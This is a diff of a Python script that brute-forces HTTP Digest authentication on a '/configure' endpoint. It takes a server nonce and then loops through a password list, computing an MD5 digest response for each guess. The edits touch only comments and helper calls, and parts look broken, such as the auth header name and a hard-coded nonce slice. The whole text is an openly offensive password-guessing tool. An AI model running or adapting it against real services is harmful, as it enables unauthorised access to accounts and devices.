@@ -1,6 +1,5 @@
 import requests
 import hash
-
 # no need for this anymore :D
 # from requests.auth import HTTPDigestAuth
 
@@ -20,7 +19,7 @@ qop = 'auth'
 nc = 1
 # get a new nonce to start the chain
 r = requests.head(url1)
-# check if this slice is right, also idk how to get this via comprehension
+# idk how to get this via comprehension, a problem with realm and qop too
 nonce = r.headers['WWW-Authenticate'][180:-13]
 # print(nonce)
 
@@ -36,9 +35,9 @@ total = 170000
 for i in range(total+1, len(passwords)):
     # too easy
     cnonce = hash.new_cnonce()
-    h1 = hash.hash1(user, realm, passwords[i])
-    h2 = hash.hash2('HEAD', '/configure')
-    response = hash.response(h1, nonce, f'{nc:08d}', cnonce, qop, h2)
+    h1 = hash.md5(user, realm, passwords[i])
+    h2 = hash.md5('HEAD', '/configure')
+    response = hash.md5(h1, nonce, f'{nc:08d}', cnonce, qop, h2)
     headers = {
         'WWW-Authenticate': f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="/configure", '
                             f'algorithm=MD5, response="{response}", qop=auth, nc={nc:08d}, cnonce="{cnonce}" '
